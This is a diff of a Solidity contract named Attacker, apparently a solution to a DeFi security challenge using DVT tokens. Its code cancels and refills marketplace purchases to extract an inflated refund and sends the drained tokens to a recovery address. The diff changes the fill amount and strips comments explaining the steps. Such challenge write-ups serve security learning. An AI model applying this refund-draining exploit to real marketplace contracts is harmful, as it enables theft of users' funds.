@@ -41,14 +41,12 @@ contract Attacker {
         marketplace.cancel(offerId, 0); // first purchase at index 0
         console.log(token.balanceOf(address(marketplace)));
 
-        // 3. Use the dust to fill a larger amount (payment ~7.5e12 DVT)
-        marketplace.fill(offerId, 1e10);
+        marketplace.fill(offerId, 1e9);
         console.log(token.balanceOf(address(marketplace)));
-        // 4. Cancel the second purchase for a massive refund (~75 DVT)
+
         marketplace.cancel(offerId, 1); // second purchase at index 1
         console.log(token.balanceOf(address(this)));
 
-        // 5. Send all drained tokens to the recovery address
         uint256 balance = token.balanceOf(address(this));
         token.transfer(recovery, balance);
     }
